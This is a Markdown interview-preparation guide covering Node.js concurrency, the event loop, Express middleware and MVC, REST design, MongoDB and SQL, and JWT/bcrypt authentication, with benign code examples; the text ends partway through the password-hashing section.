# 🚀 Node.js & Backend Engineering — Interview Prep

> A comprehensive guide covering Node.js internals, Express.js, REST APIs, databases, authentication, file uploads, and system design. Questions marked `***` are highest priority.

---

## Table of Contents

1. [Node.js Concurrency & Internals](#1-nodejs-concurrency--internals)
2. [Express.js & MVC Architecture](#2-expressjs--mvc-architecture)
3. [REST API Design](#3-rest-api-design)
4. [Databases — MongoDB & SQL](#4-databases--mongodb--sql)
5. [Authentication & Security](#5-authentication--security)
6. [File Uploads & AWS S3](#6-file-uploads--aws-s3)
7. [System Design Concepts](#7-system-design-concepts)

---

## 1. Node.js Concurrency & Internals

---

### Q1. How does Node.js handle concurrency despite being single-threaded? `***`

Node.js is single-threaded, meaning it has **one call stack** and executes one piece of JavaScript at a time. But it achieves high concurrency through **non-blocking I/O** and the **event loop**, powered by the **libuv** library.

**The key idea:** Instead of waiting for I/O (disk reads, network requests, DB queries), Node.js *delegates* those tasks to the OS or a thread pool, then continues executing other code. When the I/O finishes, a **callback** is placed in the event queue and executed when the call stack is free.

```
  ┌──────────────────────────┐
  │       JavaScript         │   ← Single thread (V8 engine)
  │      (Call Stack)        │
  └────────────┬─────────────┘
               │  delegates I/O
  ┌────────────▼─────────────┐
  │         libuv            │   ← Handles async I/O, thread pool
  │  (Event Loop + OS I/O)   │
  └────────────┬─────────────┘
               │ callback when done
  ┌────────────▼─────────────┐
  │       Event Queue        │   ← Callbacks waiting to run
  └──────────────────────────┘
```

**Analogy:** A single waiter (Node.js) takes orders (requests) and passes them to the kitchen (OS/thread pool). The waiter doesn't stand idle at the kitchen — they go serve other tables. When food is ready, the kitchen notifies the waiter to deliver it.

---

### Q2. Explain the event loop in Node.js and its 6 phases. `***`

The **event loop** is the mechanism that allows Node.js to perform non-blocking I/O operations. It continuously checks if there are tasks to execute, and which phase they belong to.

```
   ┌─────────────────────────────┐
   │           timers            │  ← setTimeout, setInterval callbacks
   └──────────────┬──────────────┘
                  │
   ┌──────────────▼──────────────┐
   │      pending callbacks      │  ← I/O errors deferred from prev loop
   └──────────────┬──────────────┘
                  │
   ┌──────────────▼──────────────┐
   │       idle, prepare         │  ← Internal use only (libuv)
   └──────────────┬──────────────┘
                  │
   ┌──────────────▼──────────────┐
   │            poll             │  ← Fetch new I/O events; execute I/O callbacks
   └──────────────┬──────────────┘
                  │
   ┌──────────────▼──────────────┐
   │            check            │  ← setImmediate() callbacks
   └──────────────┬──────────────┘
                  │
   ┌──────────────▼──────────────┐
   │       close callbacks       │  ← e.g., socket.on('close', ...)
   └─────────────────────────────┘
         ↑ loops back to top
```

| Phase | What runs here |
|---|---|
| **Timers** | `setTimeout` and `setInterval` callbacks whose delay has elapsed |
| **Pending Callbacks** | I/O callbacks deferred from the previous loop iteration (e.g., TCP errors) |
| **Idle/Prepare** | Internal use only — libuv housekeeping |
| **Poll** | Retrieves new I/O events; executes I/O-related callbacks (most callbacks land here) |
| **Check** | `setImmediate()` callbacks execute here |
| **Close Callbacks** | Cleanup callbacks like `socket.on('close')` |

> **Between each phase**, Node.js drains the **microtask queue** (Promises + `process.nextTick`).

---

### Q3. What are microtasks vs macrotasks in Node? `***`

| | Microtasks | Macrotasks |
|---|---|---|
| **Examples** | `Promise.then`, `async/await`, `process.nextTick` | `setTimeout`, `setInterval`, `setImmediate`, I/O callbacks |
| **Queue** | Microtask queue | Macrotask queue (event loop phases) |
| **Priority** | **Higher** — runs before next event loop phase | Lower — runs in its designated phase |
| **Execution** | After every task, before the next phase | Once per event loop phase |

**Order of execution:**
```
process.nextTick  →  Promise.then  →  setImmediate / setTimeout
```

```js
setTimeout(() => console.log('setTimeout'), 0);
Promise.resolve().then(() => console.log('Promise'));
process.nextTick(() => console.log('nextTick'));

// Output:
// nextTick
// Promise
// setTimeout
```

> `process.nextTick` fires before Promises, because it has its own dedicated "nextTick queue" that is drained before the microtask queue.

---

### Q4. What is the difference between a process and a thread? `***`

| | Process | Thread |
|---|---|---|
| **Definition** | An independent program in execution with its own memory space | A unit of execution *within* a process, sharing its memory |
| **Memory** | Isolated — each process has its own heap, stack, data | Shared — threads share the process's memory |
| **Communication** | IPC (pipes, sockets, shared memory) | Directly via shared variables |
| **Overhead** | High — creating a process is expensive | Low — threads are lightweight |
| **Crash isolation** | A crash in one process doesn't affect others | A crash in one thread can crash the whole process |
| **Node.js example** | `child_process.fork()` — creates a new Node process | `worker_threads` — creates threads within the Node process |

```
Process A                     Process B
┌──────────────┐              ┌──────────────┐
│  Heap        │              │  Heap        │
│  Stack       │              │  Stack       │
│  Thread 1 ──┤              ├── Thread 1   │
│  Thread 2 ──┤              │              │
└──────────────┘              └──────────────┘
  (isolated memory)             (isolated memory)
```

---

### Q5. What is the Libuv thread pool? What tasks use it? `***`

**libuv** is the C library that powers Node.js's async I/O. It provides:
1. The **event loop**
2. A **thread pool** (default: 4 threads, configurable via `UV_THREADPOOL_SIZE`)

The thread pool handles tasks that **cannot be done asynchronously at the OS level** (or tasks delegated for performance):

| Uses Thread Pool | Does NOT use Thread Pool |
|---|---|
| `fs` (file system reads/writes) | TCP/UDP networking (uses OS async) |
| `crypto` (hashing, encryption) | HTTP requests |
| `dns.lookup()` | Pipes, signals |
| `zlib` (compression) | `dns.resolve()` (uses OS async) |

```js
// This uses the thread pool — doesn't block the event loop
const crypto = require('crypto');
crypto.pbkdf2('password', 'salt', 100000, 64, 'sha512', (err, key) => {
  console.log('Done hashing');
});
console.log('This runs BEFORE hashing is done');
```

> If you fire 5 `crypto.pbkdf2` calls simultaneously and pool size is 4, the 5th waits for a free thread.

---

### Q6. How does a Node server handle 1000 requests at the same time? `***`

Node.js handles thousands of concurrent requests via **non-blocking I/O** and the **event loop** — without spawning a new thread per request (unlike Apache/PHP).

**Step-by-step flow for 1000 simultaneous requests:**

```
1000 requests arrive
      │
      ▼
Event Loop picks up each request callback
      │
      ▼
For each request — if it needs I/O (DB query, file read):
  → Node registers the I/O operation with libuv
  → Immediately moves on to the next request
      │
      ▼
OS / thread pool performs the I/O asynchronously
      │
      ▼
When I/O completes → callback is placed in event queue
      │
      ▼
Event loop picks up the callback → sends response
```

**Why this works:** Most web requests are I/O-bound (waiting for database, network). Node doesn't waste a thread waiting — it processes other requests while waiting.

**Contrast with thread-per-request model:**
```
Traditional server:    1000 requests → 1000 threads → high RAM, context switching
Node.js:               1000 requests → 1 thread + async I/O → low RAM, efficient
```

---

### Q7. What is a blocking operation in Node and why is it dangerous? `***`

A **blocking operation** is one that halts the event loop until it completes — no other code can run during this time.

**Examples of blocking operations:**
```js
// ❌ BLOCKING — stops everything
const fs = require('fs');
const data = fs.readFileSync('./large-file.txt'); // blocks event loop

// ❌ BLOCKING — CPU intensive loop
for (let i = 0; i < 1e10; i++) { /* ... */ }

// ✅ NON-BLOCKING — event loop continues
fs.readFile('./large-file.txt', (err, data) => {
  console.log(data);
});
```

**Why it's dangerous in web servers:**

```
Request 1 → triggers fs.readFileSync (blocks for 500ms)
    ↓
Request 2 → WAITS (even though it just needs "hello world")
Request 3 → WAITS
...
Request 1000 → WAITS
```

All 999 other users experience a 500ms delay because of one blocking call. In a multi-threaded server, other threads handle other requests. In Node, there's only one thread.

---

### Q8. What are clusters in Node.js and why/when do we use them? `**`

By default, a Node.js process runs on **one CPU core**. **Clusters** allow you to spawn multiple worker processes that all share the same server port — utilizing all available CPU cores.

```js
const cluster = require('cluster');
const os = require('os');
const http = require('http');

if (cluster.isPrimary) {
  const numCPUs = os.cpus().length; // e.g., 8 cores
  console.log(`Primary ${process.pid} is running`);

  for (let i = 0; i < numCPUs; i++) {
    cluster.fork(); // spawn 8 worker processes
  }

  cluster.on('exit', (worker) => {
    console.log(`Worker ${worker.process.pid} died`);
    cluster.fork(); // restart dead workers
  });
} else {
  http.createServer((req, res) => {
    res.end('Hello from worker ' + process.pid);
  }).listen(3000);
}
```

**When to use clusters:**
- Your app is **CPU-intensive** (image processing, data transformation)
- You want to utilize **multi-core machines** fully
- You need **zero-downtime restarts** (primary stays alive while workers restart)

> In production, use **PM2** (`pm2 start app.js -i max`) which manages clustering automatically.

---

### Q9. When would you use Worker Threads vs the event loop model? `*`

| | Event Loop | Worker Threads |
|---|---|---|
| **Best for** | I/O-bound tasks (DB, network, file) | CPU-bound tasks (heavy computation) |
| **Memory** | Shared process | Separate memory (communicate via messages) |
| **Overhead** | Very low | Medium (thread creation) |
| **Examples** | REST API handling, DB queries | Image resizing, video encoding, ML inference, encryption |

```js
// Worker Threads example — offload CPU work
const { Worker, isMainThread, parentPort } = require('worker_threads');

if (isMainThread) {
  const worker = new Worker(__filename);
  worker.on('message', (result) => console.log('Result:', result));
  worker.postMessage({ data: [1, 2, 3, 4, 5] });
} else {
  parentPort.on('message', ({ data }) => {
    const result = data.reduce((a, b) => a + b, 0); // heavy computation
    parentPort.postMessage(result);
  });
}
```

---

### Q10. Explain streams in Node — types and when to use them. `***`

**Streams** are objects that let you read or write data **piece by piece** (chunks), rather than loading everything into memory at once. Ideal for large files, video, real-time data.

**4 Types of Streams:**

| Type | Direction | Example |
|---|---|---|
| **Readable** | Read only | `fs.createReadStream()`, HTTP request |
| **Writable** | Write only | `fs.createWriteStream()`, HTTP response |
| **Duplex** | Read + Write | TCP socket, `net.Socket` |
| **Transform** | Read + Write + modify | `zlib.createGzip()`, encryption |

```js
// ❌ BAD — loads entire file into memory
const data = fs.readFileSync('./bigfile.mp4'); // uses GBs of RAM
res.end(data);

// ✅ GOOD — streams chunks, minimal memory usage
const readStream = fs.createReadStream('./bigfile.mp4');
readStream.pipe(res); // pipes directly to HTTP response

// Transform stream example — compress on the fly
const { createReadStream, createWriteStream } = require('fs');
const { createGzip } = require('zlib');

createReadStream('input.txt')
  .pipe(createGzip())         // Transform: compress
  .pipe(createWriteStream('output.txt.gz')); // Writable: write to disk
```

---

## 2. Express.js & MVC Architecture

---

### Q11. What is Express.js middleware and how does the middleware chain work? `***`

**Middleware** is a function that has access to `req`, `res`, and `next`. It can:
- Execute any code
- Modify `req`/`res` objects
- End the request-response cycle
- Call `next()` to pass control to the next middleware

```js
// Middleware signature
function myMiddleware(req, res, next) {
  console.log('Before route handler');
  next(); // pass to next middleware/route
}
```

**Middleware chain:**
```
Request
  │
  ▼
Middleware 1 (logger)
  │ next()
  ▼
Middleware 2 (auth check)
  │ next()
  ▼
Middleware 3 (JSON parser)
  │ next()
  ▼
Route Handler → Response
```

```js
const express = require('express');
const app = express();

// Global middleware — runs for every request
app.use(express.json());           // parse JSON body
app.use(morgan('dev'));            // logging
app.use(authMiddleware);           // authentication

// Route-specific middleware
app.get('/admin', requireAdmin, (req, res) => {
  res.json({ message: 'Admin dashboard' });
});

// Error middleware — must have 4 params
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message });
});
```

> **Order matters!** Middleware executes in the order it is defined.

---

### Q12. What is the difference between `app.use()` and `app.get()`? `***`

| | `app.use()` | `app.get()` |
|---|---|---|
| **HTTP methods** | All methods (GET, POST, PUT, DELETE...) | Only GET |
| **Path matching** | Prefix match — `/api` matches `/api`, `/api/users`, `/api/users/1` | Exact match — `/users` only matches `/users` |
| **Typical use** | Middleware, sub-routers | Route handlers |

```js
app.use('/api', router);        // Matches /api, /api/users, /api/anything
app.get('/users', handler);     // Only matches GET /users exactly

// app.use() with no path = runs for ALL routes
app.use(express.json());        // applies everywhere
```

---

### Q13. How do you design an Express backend using MVC architecture? `***`

**MVC = Model → View → Controller** (in APIs, View is replaced by the JSON response)

**Folder Structure:**
```
src/
├── routes/
│   └── user.routes.js       ← defines endpoints, maps to controllers
├── controllers/
│   └── user.controller.js   ← handles req/res, calls services
├── services/
│   └── user.service.js      ← business logic
├── models/
│   └── user.model.js        ← Mongoose/Sequelize schema
├── middleware/
│   ├── auth.middleware.js
│   └── error.middleware.js
├── config/
│   └── db.js                ← DB connection
└── app.js                   ← Express setup
```

**Flow:**
```
Request → Router → Controller → Service → Model → DB
                                              ↓
Response ←─────── Controller ←── Service ←───┘
```

```js
// routes/user.routes.js
const router = express.Router();
router.post('/register', UserController.register);
router.get('/:id', authMiddleware, UserController.getUser);

// controllers/user.controller.js
class UserController {
  static async register(req, res, next) {
    try {
      const user = await UserService.createUser(req.body);
      res.status(201).json({ success: true, data: user });
    } catch (err) {
      next(err); // pass to error middleware
    }
  }
}

// services/user.service.js
class UserService {
  static async createUser(data) {
    const hashedPassword = await bcrypt.hash(data.password, 10);
    return await User.create({ ...data, password: hashedPassword });
  }
}

// models/user.model.js
const userSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, unique: true },
  password: String
});
```

---

### Q14. What is the best practice for error handling in Express? `***`

**Centralized error middleware** — a single place to handle all errors consistently.

```js
// middleware/error.middleware.js
const errorHandler = (err, req, res, next) => {
  const statusCode = err.statusCode || 500;
  const message = err.message || 'Internal Server Error';

  // Log error details (don't expose stack in production)
  console.error(err.stack);

  res.status(statusCode).json({
    success: false,
    error: {
      message,
      ...(process.env.NODE_ENV === 'development' && { stack: err.stack })
    }
  });
};

// Custom error class
class AppError extends Error {
  constructor(message, statusCode) {
    super(message);
    this.statusCode = statusCode;
    this.isOperational = true; // distinguish from programming errors
  }
}

// In a route/service — throw custom errors
throw new AppError('User not found', 404);

// app.js — MUST be last middleware
app.use(errorHandler);
```

**Best practices:**
- Always use `next(err)` in async routes (or wrap with `asyncHandler`)
- Distinguish **operational errors** (invalid input, 404) from **programming errors** (bugs)
- Never send stack traces in production
- Log errors with a logger (Winston, Morgan)

---

### Q15. What's the difference between `next(err)` and throwing errors in async Express routes? `***`

```js
// ❌ Throwing in async route — Express does NOT catch this automatically (older versions)
app.get('/user', async (req, res) => {
  throw new Error('Something broke'); // Uncaught, crashes server!
});

// ✅ Option 1: Use next(err) explicitly
app.get('/user', async (req, res, next) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) return next(new AppError('Not found', 404));
    res.json(user);
  } catch (err) {
    next(err); // passes to error middleware
  }
});

// ✅ Option 2: asyncHandler wrapper (eliminates try/catch boilerplate)
const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

app.get('/user', asyncHandler(async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user);
}));

// ✅ Option 3: Express 5.x (async errors are caught automatically)
// express-async-errors package polyfills this for Express 4
```

**Key rule:** In Express 4, `throw` inside async functions is NOT caught — always use `next(err)` or `asyncHandler`.

---

### Q16. How do you handle 404 routes cleanly in Express? `**`

```js
// Add AFTER all valid routes, BEFORE error middleware
app.use((req, res, next) => {
  next(new AppError(`Route ${req.originalUrl} not found`, 404));
});

// Error middleware handles it
app.use(errorHandler);
```

---

### Q17. How do you design consistent API responses? `**`

**Why:** Consumers (frontend, mobile, other services) need a predictable structure.

```js
// ✅ Consistent response structure
// Success
{
  "success": true,
  "data": { "id": 1, "name": "Alice" },
  "message": "User fetched successfully"
}

// Error
{
  "success": false,
  "error": {
    "message": "User not found",
    "code": "USER_NOT_FOUND"
  }
}

// Paginated list
{
  "success": true,
  "data": [...],
  "pagination": {
    "page": 1,
    "limit": 10,
    "total": 100,
    "totalPages": 10
  }
}

// Helper functions
const sendSuccess = (res, data, message = 'Success', statusCode = 200) =>
  res.status(statusCode).json({ success: true, data, message });

const sendError = (res, message, statusCode = 500) =>
  res.status(statusCode).json({ success: false, error: { message } });
```

---

## 3. REST API Design

---

### Q18. What are REST principles and what makes an API "RESTful"? `***`

**REST** (Representational State Transfer) is an architectural style with 6 constraints:

| Principle | Meaning |
|---|---|
| **Client-Server** | Separation of concerns — UI and data storage are decoupled |
| **Stateless** | Each request contains all info needed; server stores no client state |
| **Cacheable** | Responses must define whether they can be cached |
| **Uniform Interface** | Consistent resource naming + HTTP methods |
| **Layered System** | Client doesn't know if it's talking to the actual server or a proxy |
| **Code on Demand** (optional) | Server can send executable code (e.g., JavaScript) |

**RESTful URL design:**
```
GET    /users           → list all users
POST   /users           → create a user
GET    /users/:id       → get one user
PUT    /users/:id       → replace a user
PATCH  /users/:id       → partially update a user
DELETE /users/:id       → delete a user

GET    /users/:id/orders       → get orders of a specific user
POST   /users/:id/orders       → create order for that user
```

**NOT RESTful (RPC style):**
```
POST /getUser        ❌
POST /createUser     ❌
POST /deleteUser     ❌
```

---

### Q19. Difference between PUT vs PATCH with real examples and idempotency. `***`

| | PUT | PATCH |
|---|---|---|
| **Purpose** | Replace the entire resource | Partially update the resource |
| **Body** | Full resource representation | Only the fields to change |
| **Idempotent** | ✅ Yes | ⚠️ Depends on implementation |
| **Missing fields** | Set to null/default | Unchanged |

```js
// User object: { name: "Alice", email: "a@a.com", age: 25 }

// PUT /users/1 — must send FULL object
PUT /users/1
Body: { "name": "Alice Updated", "email": "a@a.com", "age": 25 }
// If you omit age → it gets nulled out

// PATCH /users/1 — send only what changes
PATCH /users/1
Body: { "name": "Alice Updated" }
// email and age remain unchanged ✅
```

**Idempotency:** Calling the same PUT request 10 times produces the same result as calling it once. PATCH *can* be non-idempotent (e.g., PATCH that increments a counter).

---

### Q20. What is idempotency in APIs and why does it matter? `**`

An operation is **idempotent** if performing it multiple times produces the same result as performing it once.

| Method | Idempotent? | Safe? |
|---|---|---|
| GET | ✅ Yes | ✅ Yes |
| PUT | ✅ Yes | ❌ No |
| DELETE | ✅ Yes | ❌ No |
| POST | ❌ No | ❌ No |
| PATCH | ⚠️ Usually | ❌ No |

**Why it matters:** Networks are unreliable. If a client sends a request and gets no response (timeout), it may retry. If the operation is idempotent, retrying is safe. If POST is retried, you may create duplicate records.

**Solution for non-idempotent operations:** Use **idempotency keys**:
```
POST /payments
Idempotency-Key: unique-client-generated-uuid
```
Server stores the key → if same key is received again, returns cached response instead of processing twice.

---

### Q21. CRUD without a DB — in-memory store, risks. `**`

```js
// Simple in-memory store
const store = {
  users: [],
  nextId: 1
};

// CREATE
function createUser(data) {
  const user = { id: store.nextId++, ...data, createdAt: new Date() };
  store.users.push(user);
  return user;
}

// READ
function getUserById(id) {
  return store.users.find(u => u.id === id) || null;
}

// UPDATE
function updateUser(id, data) {
  const idx = store.users.findIndex(u => u.id === id);
  if (idx === -1) return null;
  store.users[idx] = { ...store.users[idx], ...data };
  return store.users[idx];
}

// DELETE
function deleteUser(id) {
  const idx = store.users.findIndex(u => u.id === id);
  if (idx === -1) return false;
  store.users.splice(idx, 1);
  return true;
}
```

**Risks of in-memory store:**
- ❌ **Data lost** when server restarts
- ❌ **Not scalable** — multiple instances each have their own copy
- ❌ **No transactions** — race conditions possible
- ❌ **Memory limits** — can't store large datasets

---

### Q22. What changes when you move from CRUD without DB to CRUD with a database? `***`

| Aspect | In-Memory | With Database |
|---|---|---|
| **Persistence** | Lost on restart | Survives restarts |
| **Schema** | Plain JS objects | Enforced schema (Mongoose/Sequelize) |
| **Queries** | `Array.filter()` | SQL/MongoDB query language (indexed) |
| **Concurrency** | Race conditions in arrays | DB handles locking/transactions |
| **Relationships** | Manual references | Foreign keys / MongoDB references |
| **Performance** | O(n) scan | O(log n) with indexes |
| **Async nature** | Sync | All DB calls are async — must `await` |

```js
// In-memory (sync)
const user = users.find(u => u.email === email);

// With DB (async)
const user = await User.findOne({ email }); // must await
```

---

## 4. Databases — MongoDB & SQL

---

### Q23. What is a database connection pool and why do we need it? `**`

**Connection pool** = a cache of reusable database connections maintained so that connections can be reused when future requests are needed, rather than establishing a new connection each time.

```
Without pool:
Request 1 → Open connection → Query → Close connection (slow: ~100ms overhead)
Request 2 → Open connection → Query → Close connection
...

With pool (10 connections):
Request 1  ─┐
Request 2  ─┤→ Pool (connections already open) → Query → return to pool
Request 3  ─┘
```

```js
// Mongoose manages connection pooling automatically
mongoose.connect(MONGO_URI, {
  maxPoolSize: 10,      // max 10 simultaneous connections
  minPoolSize: 2,       // always keep 2 alive
  serverSelectionTimeoutMS: 5000
});

// node-postgres (pg) pool
const { Pool } = require('pg');
const pool = new Pool({ max: 20, idleTimeoutMillis: 30000 });
const client = await pool.connect();
// ... query ...
client.release(); // returns to pool
```

**Why needed:**
- Opening a DB connection is expensive (TCP handshake, auth)
- Web servers receive burst traffic — can't afford per-request connection overhead
- Limits max connections to DB (prevents overloading)

---

### Q24. What are Models in backend and why do we use them? `***`

A **Model** is a class/object that represents a collection (MongoDB) or table (SQL) and provides methods to interact with it. It's the **M** in MVC.

```js
// Mongoose model
const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
  name: { type: String, required: true },
  email: { type: String, unique: true, lowercase: true },
  password: String,
  role: { type: String, enum: ['user', 'admin'], default: 'user' },
  createdAt: { type: Date, default: Date.now }
});

// Instance methods
userSchema.methods.comparePassword = async function(candidatePassword) {
  return bcrypt.compare(candidatePassword, this.password);
};

// Static methods
userSchema.statics.findByEmail = function(email) {
  return this.findOne({ email });
};

const User = mongoose.model('User', userSchema);

// Usage
const user = await User.create({ name: 'Alice', email: 'a@a.com', password: '...' });
const found = await User.findByEmail('a@a.com');
```

**Why models:**
- Encapsulates data structure and DB logic
- Validates data before saving
- Provides reusable query methods
- Keeps controllers lean

---

### Q25. What is a Schema and what constraints can it enforce? `***`

A **schema** defines the structure of data: field names, types, validation rules, defaults, and constraints.

**MongoDB Schema (Mongoose):**
```js
const productSchema = new mongoose.Schema({
  name:     { type: String, required: true, trim: true, maxlength: 100 },
  price:    { type: Number, required: true, min: 0 },
  stock:    { type: Number, default: 0, min: 0 },
  category: { type: String, enum: ['electronics', 'clothing', 'food'] },
  tags:     [String],
  isActive: { type: Boolean, default: true },
  createdAt:{ type: Date,   default: Date.now }
});
```

**SQL Schema:**
```sql
CREATE TABLE products (
  id          SERIAL PRIMARY KEY,
  name        VARCHAR(100) NOT NULL,
  price       DECIMAL(10,2) NOT NULL CHECK (price >= 0),
  stock       INT DEFAULT 0 CHECK (stock >= 0),
  category    VARCHAR(50),
  is_active   BOOLEAN DEFAULT TRUE,
  created_at  TIMESTAMP DEFAULT NOW(),
  user_id     INT REFERENCES users(id) ON DELETE CASCADE -- foreign key
);
```

**Constraints both can enforce:**
- Required / NOT NULL
- Unique values
- Min/Max values
- Enum (allowed values)
- Default values
- Data type enforcement
- Referential integrity (SQL: foreign keys)

---

### Q26. When should you use MongoDB over SQL and vice versa? `***`

| Factor | Use MongoDB | Use SQL (PostgreSQL/MySQL) |
|---|---|---|
| **Data shape** | Flexible, nested, varies per record | Fixed, tabular, well-defined |
| **Schema** | Schema-less / evolving schema | Rigid schema, structured |
| **Relationships** | Few joins needed | Complex relationships + joins |
| **Transactions** | Single-document ACID only (multi-doc in 4.0+) | Strong multi-table transactions |
| **Scaling** | Horizontal scaling (sharding) built-in | Vertical scaling (primary), harder to shard |
| **Queries** | Document queries, aggregation pipeline | Complex SQL joins, GROUP BY, window functions |
| **Use cases** | Real-time apps, catalogs, CMS, event logs | Financial systems, e-commerce, ERP, anything needing strong consistency |

**Rule of thumb:**
- Need **joins and transactions** → SQL
- Need **flexible schema and horizontal scale** → MongoDB
- Need **both** → PostgreSQL with JSONB columns

---

### Q27. Explain ACID properties and why they matter in SQL. `**`

| Property | Meaning | Example |
|---|---|---|
| **Atomicity** | All operations in a transaction succeed, or none do | Transfer money: debit + credit both happen or neither |
| **Consistency** | DB moves from one valid state to another; all rules enforced | Balance can never go negative (CHECK constraint respected) |
| **Isolation** | Concurrent transactions don't interfere with each other | Two users booking the same seat — only one succeeds |
| **Durability** | Committed transactions survive system crashes | Power goes out — committed payment is still recorded |

```sql
BEGIN;
  UPDATE accounts SET balance = balance - 500 WHERE id = 1;
  UPDATE accounts SET balance = balance + 500 WHERE id = 2;
COMMIT; -- Both succeed
-- If error occurs: ROLLBACK — neither change is saved
```

---

### Q28. What is a transaction and when is it needed? `**`

A **transaction** groups multiple operations into a single atomic unit — either all succeed or all fail.

```js
// Mongoose transaction (MongoDB 4.0+)
const session = await mongoose.startSession();
session.startTransaction();
try {
  await Order.create([{ product: 'X', user: userId }], { session });
  await Product.updateOne({ _id: productId }, { $inc: { stock: -1 } }, { session });
  await session.commitTransaction();
} catch (err) {
  await session.abortTransaction();
  throw err;
} finally {
  session.endSession();
}
```

**When you need transactions:**
- Transferring money between accounts
- Creating an order + reducing inventory simultaneously
- Registering a user + creating their default profile
- Any operation where partial completion would leave data inconsistent

---

### Q29. What is indexing and how does it affect performance? `**`

An **index** is a data structure (usually a B-tree) that allows the database to find records without scanning every row/document.

```js
// MongoDB — create indexes
userSchema.index({ email: 1 });           // single field
userSchema.index({ name: 1, age: -1 });   // compound index
userSchema.index({ email: 1 }, { unique: true });

// SQL
CREATE INDEX idx_users_email ON users(email);
CREATE INDEX idx_orders_user_date ON orders(user_id, created_at DESC);
```

| | Without Index | With Index |
|---|---|---|
| **Read speed** | O(n) — full collection scan | O(log n) — tree traversal |
| **Write speed** | Fast — just insert | Slower — must update index too |
| **Storage** | Less | More (index takes space) |

**Rules:**
- Index fields you frequently **query, sort, or filter** by
- Don't over-index — each write updates all indexes
- Use `.explain()` in MongoDB / `EXPLAIN ANALYZE` in SQL to check if indexes are being used

---

### Q30. Embedding vs referencing in MongoDB: when to choose each? `**`

| | Embedding | Referencing |
|---|---|---|
| **What** | Store related data inside the same document | Store ObjectId and look up separately |
| **Read** | Fast — single query | Requires populate/join (extra query) |
| **Write** | Simple — one document | Must update multiple documents |
| **Size** | Grows with embedded data | Documents stay small |
| **Best for** | "Belongs to" + read-heavy + rarely changes | Large sub-documents + shared data + many-to-many |

```js
// Embedding — good for comments on a post (1:few)
{
  _id: "post1",
  title: "My Post",
  comments: [
    { user: "Alice", text: "Great!", createdAt: "..." },
    { user: "Bob", text: "Thanks!", createdAt: "..." }
  ]
}

// Referencing — good for orders referencing products (many:many)
{
  _id: "order1",
  user: ObjectId("user1"),
  products: [ObjectId("prod1"), ObjectId("prod2")]  // references
}
// Fetch with: Order.find().populate('products')
```

**Rule of thumb:** Embed when the data is always accessed together and won't grow unboundedly. Reference when data is shared, large, or needs independent querying.

---

## 5. Authentication & Security

---

### Q31. Explain authentication vs authorization in detail. `***`

| | Authentication | Authorization |
|---|---|---|
| **Question** | "Who are you?" | "What can you do?" |
| **Process** | Verify identity (login with credentials) | Check permissions for a resource |
| **When** | First step | After authentication |
| **Example** | Logging into Gmail | Accessing another user's emails |
| **HTTP status on failure** | 401 Unauthorized | 403 Forbidden |

```js
// Authentication middleware — verify token
const authenticate = async (req, res, next) => {
  const token = req.cookies.accessToken;
  if (!token) return res.status(401).json({ error: 'Not authenticated' });
  try {
    req.user = jwt.verify(token, process.env.JWT_SECRET);
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
};

// Authorization middleware — check role
const authorize = (...roles) => (req, res, next) => {
  if (!roles.includes(req.user.role)) {
    return res.status(403).json({ error: 'Access denied' });
  }
  next();
};

// Usage
app.delete('/users/:id', authenticate, authorize('admin'), deleteUser);
```

---

### Q32. Where should you store tokens: httpOnly cookies vs localStorage? `***`

| | httpOnly Cookies | localStorage |
|---|---|---|
| **XSS (script injection)** | ✅ Safe — JS cannot access httpOnly cookies | ❌ Vulnerable — `document.localStorage` accessible to scripts |
| **CSRF (cross-site request forgery)** | ❌ Vulnerable — cookies auto-sent on requests | ✅ Safe — not sent automatically |
| **Auto-sent** | ✅ Yes (browser handles) | ❌ Must manually add to headers |
| **Mobile friendly** | ⚠️ Trickier in mobile apps | ✅ Easy to use in mobile/React Native |
| **Recommended for** | Web apps (with CSRF protection) | Mobile apps / SPAs with strict CSP |

**Best practice for web apps:**
```js
// Server: set httpOnly cookie
res.cookie('accessToken', token, {
  httpOnly: true,    // JS cannot access
  secure: true,      // HTTPS only
  sameSite: 'Strict', // CSRF protection
  maxAge: 15 * 60 * 1000 // 15 minutes
});
```

---

### Q33. Explain JWT flow (access token + refresh token) end-to-end. `***`

```
1. LOGIN
   Client → POST /auth/login { email, password }
   Server → Verifies credentials
   Server → Issues:
     • accessToken  (short-lived: 15min)  — stored in memory / httpOnly cookie
     • refreshToken (long-lived: 7 days)  — stored in httpOnly cookie + DB

2. AUTHENTICATED REQUEST
   Client → GET /api/profile
             Authorization: Bearer <accessToken>
   Server → Validates accessToken signature + expiry
   Server → Returns data

3. TOKEN REFRESH (when accessToken expires)
   Client → POST /auth/refresh
             Cookie: refreshToken=<token>
   Server → Validates refreshToken against DB
   Server → Issues new accessToken (and optionally new refreshToken — rotation)

4. LOGOUT
   Client → POST /auth/logout
   Server → Deletes refreshToken from DB
   Server → Clears cookies
```

```js
// Generate tokens
const generateTokens = (userId) => ({
  accessToken: jwt.sign({ id: userId }, process.env.JWT_SECRET, { expiresIn: '15m' }),
  refreshToken: jwt.sign({ id: userId }, process.env.REFRESH_SECRET, { expiresIn: '7d' })
});

// Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const { refreshToken } = req.cookies;
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });

  const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET);
  const stored = await Token.findOne({ userId: decoded.id, token: refreshToken });
  if (!stored) return res.status(403).json({ error: 'Invalid refresh token' });

  const { accessToken } = generateTokens(decoded.id);
  res.json({ accessToken });
});
```

---

### Q34. What is Bcrypt and why is it preferred for password hashing? `***`

**Bcrypt** is a password hashing algorithm designed to be **slow on purpose** — making brute-force attacks impractical.

**Why not MD5/SHA256?**
- They're designed to be **fast** → millions of hashes/second on modern hardware
- Attacker can brute-force millions of passwords quickly

**Why Bcrypt:**
- **Salt** — adds random data before hashing, so same password → different hash
- **Work factor (cost)** — configurable rounds (e.g., 10-12), making it exponentially slower
- **Future-proof** — increase cost factor as hardware improves

```js
const bcrypt = require('bcrypt');

// Hash password (cost factor 12 = 2^12 rounds)
const hashedPassword = await bcrypt.hash(plainPassword, 12);

// Verify
const isMatch = await bcrypt.compare(plainPassword, hashedPassword);

